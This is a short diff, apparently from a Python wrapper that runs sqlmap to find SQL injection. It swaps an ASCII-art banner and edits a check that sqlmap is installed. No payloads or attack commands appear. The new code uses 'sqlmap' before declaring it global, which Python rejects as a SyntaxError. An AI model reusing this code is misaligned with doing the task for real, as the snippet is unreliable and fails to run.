-    print("    / /_/ / __ \/ __  /   \__ \/ / / / / /      / / __ \  / / _ \/ ___/ __/ / __ \/ __ |")
-    print("   / __/ / / / / /_/ /   ___/ / /_/ / / /___   / / / / / / /  __/ /__/ /_/ / /_/ / / / /")
-    print("  /_/ /_/_/ /_/\__,_/   /____/\___\_\/_____/  /_/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ ")
-    print("                                                     /___/                              ")
+    print('\n\n')
+    print('      _____           __   _____ ____    __       _         _           __  _           ')
+    print('     / __(_)___  ____/ /  / ___// __ \  / /      (_)___    (_)__  _____/ /_(_)___  ____ ')
+    print('    / /_/ / __ \/ __  /   \__ \/ / / / / /      / / __ \  / / _ \/ ___/ __/ / __ \/ __ |')
+    print('   / __/ / / / / /_/ /   ___/ / /_/ / / /___   / / / / / / /  __/ /__/ /_/ / /_/ / / / /')
+    print('  /_/ /_/_/ /_/\__,_/   /____/\___\_\/_____/  /_/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ ')
+    print('                                                     /___/                              ')
     print('\n')
     print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
-    comm.checkInstalledOpt(sqlmappath)
+    comm.checkInstalledOpt(sqlmap)
+    global sqlmap
+    sqlmap = SQLMAP_SYM
     comm.checkNetConnectionV()
     print('')
     global sop
